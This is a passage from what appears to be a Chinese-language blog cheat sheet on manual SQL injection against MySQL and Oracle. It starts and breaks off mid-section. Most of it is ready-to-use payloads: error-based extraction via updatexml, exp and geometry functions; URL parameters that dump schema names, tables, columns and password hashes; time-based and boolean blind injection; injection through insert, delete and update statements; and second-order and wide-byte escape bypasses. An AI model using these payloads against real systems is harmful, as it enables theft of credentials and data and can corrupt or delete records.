(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><h4 id="4-geometrycollection-（5-1-version"><a href="#4-geometrycollection-（5-1-version" class="headerlink" title="4.geometrycollection()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>4.geometrycollection()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> geometrycollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> database())a)b));<br></code></pre></td></tr></table></figure><h4 id="5-multipoint-（5-1-version"><a href="#5-multipoint-（5-1-version" class="headerlink" title="5.multipoint()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>5.multipoint()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h4 id="6-polygon-（5-1-version"><a href="#6-polygon-（5-1-version" class="headerlink" title="6.polygon()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>6.polygon()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h4 id="7-multipolygon-（5-1-version"><a href="#7-multipolygon-（5-1-version" class="headerlink" title="7.multipolygon()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>7.multipolygon()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h4 id="8-linestring-（5-1-version"><a href="#8-linestring-（5-1-version" class="headerlink" title="8.linestring()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>8.linestring()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> linestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h4 id="9-multilinestring-（5-1-version"><a href="#9-multilinestring-（5-1-version" class="headerlink" title="9.multilinestring()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>9.multilinestring()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h4 id="10-exp-（5-1-version"><a href="#10-exp-（5-1-version" class="headerlink" title="10.exp()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>10.exp()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));<br></code></pre></td></tr></table></figure><h4 id="11-NAME-CONST"><a href="#11-NAME-CONST" class="headerlink" title="11.NAME_CONST()"></a>11.NAME_CONST()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> name_const(@<span class="hljs-variable">@version</span>,<span class="hljs-number">0</span>))a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> name_const(@<span class="hljs-variable">@version</span>,<span class="hljs-number">0</span>))b)c);<br></code></pre></td></tr></table></figure><h4 id="12-join"><a href="#12-join" class="headerlink" title="12.join"></a>12.join</h4><p><code>select * from(select * from mysql.user a join mysql.user b)c;</code></p><h4 id="13-ST-LatFromGeoHash-（-5-7）"><a href="#13-ST-LatFromGeoHash-（-5-7）" class="headerlink" title="13.ST_LatFromGeoHash()（&gt;&#x3D;5.7）"></a>13.ST_LatFromGeoHash()（&gt;&#x3D;5.7）</h4><p><code>select ST_LatFromGeoHash(user());</code></p><h4 id="14-ST-LongFromGeoHash-（-5-7）"><a href="#14-ST-LongFromGeoHash-（-5-7）" class="headerlink" title="14.ST_LongFromGeoHash()（&gt;&#x3D;5.7）"></a>14.ST_LongFromGeoHash()（&gt;&#x3D;5.7）</h4><p><code>select ST_LongFromGeoHash(user());</code></p><h4 id="15-GTID-SUBSET-（-5-7）"><a href="#15-GTID-SUBSET-（-5-7）" class="headerlink" title="15.GTID_SUBSET()（&gt;&#x3D;5.7）"></a>15.GTID_SUBSET()（&gt;&#x3D;5.7）</h4><p><code>select GTID_SUBSET(user(),1);</code></p><h4 id="16-GTID-SUBTRACT-（-5-7）"><a href="#16-GTID-SUBTRACT-（-5-7）" class="headerlink" title="16.GTID_SUBTRACT()（&gt;&#x3D;5.7）"></a>16.GTID_SUBTRACT()（&gt;&#x3D;5.7）</h4><p><code>select GTID_SUBTRACT(user(),1);</code></p><h4 id="17-ST-PointFromGeoHash-（-5-7）"><a href="#17-ST-PointFromGeoHash-（-5-7）" class="headerlink" title="17.ST_PointFromGeoHash()（&gt;&#x3D;5.7）"></a>17.ST_PointFromGeoHash()（&gt;&#x3D;5.7）</h4><p><code>select ST_PointFromGeoHash(user(),1);</code></p><h4 id="18-procedure-analyse-（"><a href="#18-procedure-analyse-（" class="headerlink" title="18.procedure analyse()（*&lt;&#x3D;5.6.17）"></a>18.procedure analyse()（*&lt;&#x3D;5.6.17）</h4><p><code>procedure analyse(extractvalue(1,concat(0x3a,user())),1)；</code> 放在语句末尾</p><p>每个一个报错语句都有它的原理：</p><p>exp() 报错的原理：exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。</p><p>updatexml() 报错的原理：由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p><p>爆库：<code>?id=1&#39; and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +</code><br>爆表：<code>?id=1&#39; and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1) -- +</code><br>爆字段：<code>?id=1&#39; and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +</code><br>爆数据：<code>?id=1&#39; and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +</code></p><p>#concat 也可以放在外面 <code>updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</code></p><p>这里需要注意的是它加了连接字符，导致数据中的 md5 只能爆出 31 位，这里可以用分割函数分割出来：<br><code>substr(string string,num start,num length);</code><br>#string为字符串,start为起始位置,length为长度<br><code>?id=1&#39; and updatexml(1,concat(0x7e, substr((select password from users limit 1,1),1,16),0x7e),1) -- +</code></p><h3 id="1-3-盲注"><a href="#1-3-盲注" class="headerlink" title="1.3 盲注"></a>1.3 盲注</h3><h4 id="1-3-1-时间盲注"><a href="#1-3-1-时间盲注" class="headerlink" title="1.3.1 时间盲注"></a>1.3.1 时间盲注</h4><p>时间盲注也叫延时注入 一般用到函数 sleep() BENCHMARK() 还可以使用笛卡尔积(尽量不要使用,内容太多会很慢很慢)</p><p>一般时间盲注我们还需要使用条件判断函数</p><p>#if（expre1，expre2，expre3）<br>当 expre1 为 true 时，返回 expre2，false 时，返回 expre3</p><p>#盲注的同时也配合着 mysql 提供的分割函数<br>substr、substring、left<br>我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号，常用到的就有 ascii() hex() 等等</p><p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))–+<br>?id&#x3D;1’ and if((substr((select user()),1,1)&#x3D;’r’),sleep(5),1)–+</p><h4 id="1-3-2-布尔盲注"><a href="#1-3-2-布尔盲注" class="headerlink" title="1.3.2 布尔盲注"></a>1.3.2 布尔盲注</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select user()),1,1)=&#x27;</span>r<span class="hljs-string">&#x27; -- +</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> IFNULL((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;r&#x27;</span>),<span class="hljs-number">0</span>) <span class="hljs-comment">-- +</span><br></code></pre></td></tr></table></figure><p>#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and strcmp((substr((select user()),1,1)=&#x27;</span>r<span class="hljs-string">&#x27;),1) -- +</span><br></code></pre></td></tr></table></figure><p>#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1</p><h3 id="1-4-insert-delete-update"><a href="#1-4-insert-delete-update" class="headerlink" title="1.4 insert,delete,update"></a>1.4 insert,delete,update</h3><p>insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般较难发现，我们可以尝试性插入、引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p><h4 id="1-4-1-报错"><a href="#1-4-1-报错" class="headerlink" title="1.4.1 报错"></a>1.4.1 报错</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mysql&gt; insert into admin (id,username,password) values (<span class="hljs-number">2</span>,&quot;or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(version())),<span class="hljs-number">0</span>) or&quot;,&quot;admin&quot;);<br>Query OK, <span class="hljs-number">1</span> row affected (<span class="hljs-number">0</span>.<span class="hljs-number">00</span> sec)<br><br>mysql&gt; select * from admin;<br>+------+-----------------------------------------------+----------+<br>| id   | username                                      | password |<br>+------+-----------------------------------------------+----------+<br>|    <span class="hljs-number">1</span> | admin                                         | admin    |<br>|    <span class="hljs-number">1</span> | and <span class="hljs-number">1</span>=<span class="hljs-number">1</span>                                       | admin    |<br>|    <span class="hljs-number">2</span> | or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(version())),<span class="hljs-number">0</span>) or | admin    |<br>+------+-----------------------------------------------+----------+<br><span class="hljs-number">3</span> rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (<span class="hljs-number">0</span>.<span class="hljs-number">00</span> sec)<br><br>mysql&gt; insert into admin (id,username,password) values (<span class="hljs-number">2</span>,&quot;&quot;or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(version())),<span class="hljs-number">0</span>) or&quot;&quot;,&quot;admin&quot;);<br>ERROR <span class="hljs-number">1105</span> (HY000): XPATH syntax error: &#x27;~<span class="hljs-number">5</span>.<span class="hljs-number">5</span>.<span class="hljs-number">53</span>&#x27;<br></code></pre></td></tr></table></figure><p>#delete 注入很危险，很危险，很危险，切记不能使用 or 1&#x3D;1 ，or 右边一定要为false</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">-2</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(version())),<span class="hljs-number">0</span>);<br>ERROR <span class="hljs-number">1105</span> (HY000): XPATH syntax error: <span class="hljs-string">&#x27;~5.5.53&#x27;</span><br></code></pre></td></tr></table></figure><p>1.4.2 盲注</p><p>#int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>+<span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;1&#x27;</span>,&quot;admin&quot;);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-keyword">row</span> affected (<span class="hljs-number">5.00</span> sec)<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>+<span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;p&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;1&#x27;</span>,&quot;admin&quot;);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-keyword">row</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>#字符型注意闭合不能使用and</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;&#x27;</span>+<span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;p&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;&#x27;</span>,&quot;admin&quot;);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-keyword">row</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;&#x27;</span>+<span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;&#x27;</span>,&quot;admin&quot;);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-keyword">row</span> affected (<span class="hljs-number">5.01</span> sec)<br></code></pre></td></tr></table></figure><p>delete 函数 or 右边一定要为 false</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">where</span> id =<span class="hljs-number">-2</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r4&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">where</span> id =<span class="hljs-number">-2</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">5.00</span> sec)<br></code></pre></td></tr></table></figure><p>#update 更新数据内容</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select * from admin;</span><br><span class="hljs-section">+------+----------+----------+</span><br><span class="hljs-section">| id   | username | password |</span><br><span class="hljs-section">+------+----------+----------+</span><br>|    2 | 1        | admin    |<br>|    2 | 1        | admin    |<br>|    2 | 1        | admin    |<br><span class="hljs-section">|    2 | admin    | admin    |</span><br><span class="hljs-section">+------+----------+----------+</span><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysql</span>&gt; update admin set id=<span class="hljs-string">&quot;5&quot;</span>+sleep(<span class="hljs-number">5</span>)+<span class="hljs-string">&quot;&quot;</span> where id=<span class="hljs-number">2</span>;<br><span class="hljs-attribute">Query</span> OK, <span class="hljs-number">4</span> rows affected (<span class="hljs-number">20</span>.<span class="hljs-number">00</span> sec)<br><span class="hljs-attribute">Rows</span> matched: <span class="hljs-number">4</span>  Changed: <span class="hljs-number">4</span>  Warnings: <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="1-5-二次注入与宽字节注入"><a href="#1-5-二次注入与宽字节注入" class="headerlink" title="1.5 二次注入与宽字节注入"></a>1.5 二次注入与宽字节注入</h3><p>二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码他，这样就不会带有单引号等。</p><p>mysql&gt; insert into admin (id,name,pass) values (‘3’,0x61646d696e272d2d2b,’11’);<br>Query OK, 1 row affected (0.00 sec)</p><p>mysql&gt; select * from admin;<br>+—-+———–+——-+<br>| id | name      | pass  |<br>+—-+———–+——-+<br>|  1 | admin     | admin |<br>|  2 | admin’111 | 11111 |<br>|  3 | admin’–+ | 11    |<br>+—-+———–+——-+<br>4 rows in set (0.00 sec)<br>二次注入在没有源码的情况比较难发现，通常见于注册，登录恶意账户后，数据库可能会因为恶意账户名的问题，将 admin’–+ 误认为 admin 账户</p><p>宽字节注入：针对目标做了一定的防护，单引号转变为 &#39; , mysql 会将 \ 编码为 %5c ，宽字节中两个字节代表一个汉字，所以把 %df 加上 %5c 就变成了一个汉字“運”，使用这种方法成功绕过转义，就是所谓的宽字节注入<br>id&#x3D;-1%df’ union select…</p><p><strong>没使用宽字节</strong><br>%27 -&gt; %5C%27</p><p><strong>使用宽字节</strong><br>%df%27 -&gt; %df%5c%27 -&gt; 運’</p><h2 id="0x02-Oracle-手工注入"><a href="#0x02-Oracle-手工注入" class="headerlink" title="0x02 Oracle 手工注入"></a>0x02 Oracle 手工注入</h2><h3 id="2-1-联合注入"><a href="#2-1-联合注入" class="headerlink" title="2.1 联合注入"></a>2.1 联合注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select user,null from dual--</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> version,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> v$instance<span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> column_name,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> rownum <span class="hljs-keyword">as</span> limit,column_name <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> table_name <span class="hljs-operator">=</span><span class="hljs-string">&#x27;USERS&#x27;</span>) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">2</span>)<span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select username,passwd from users--</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,passwd <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> username,passwd,rownum <span class="hljs-keyword">as</span> limit <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">3</span>)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h3 id="2-2-报错注入"><a href="#2-2-报错注入" class="headerlink" title="2.2 报错注入"></a>2.2 报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=ctxsys.drithsx.sn(1,(select user from dual))--</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> v$version <span class="hljs-keyword">where</span> banner <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;Oracle%))--</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> rownum <span class="hljs-keyword">as</span> limit,table_name <span class="hljs-keyword">from</span> user_tables) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span> <span class="hljs-number">3</span>))<span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name =&#x27;</span>USERS<span class="hljs-string">&#x27;) where limit=3))--</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> passwd <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> passwd,rownum <span class="hljs-keyword">as</span> limit <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">1</span>))<span class="hljs-operator">-</span><br></code></pre></td></tr></table></figure><h3 id="2-3-盲注"><a href="#2-3-盲注" class="headerlink" title="2.3 盲注"></a>2.3 盲注</h3><h4 id="2-3-1-布尔盲注"><a href="#2-3-1-布尔盲注" class="headerlink" title="2.3.1 布尔盲注"></a>2.3.1 布尔盲注</h4><p>既然是盲注，那么肯定涉及到条件判断语句，Oracle除了使用IF the else end if这种复杂的，还可以使用 decode() 函数。<br>语法：decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值);</p><p>该函数的含义如下：<br>IF 条件&#x3D;值1 THEN<br>　　　　RETURN(返回值1)<br>ELSIF 条件&#x3D;值2 THEN<br>　　　　RETURN(返回值2)<br>　　　　……<br>ELSIF 条件&#x3D;值n THEN<br>　　　　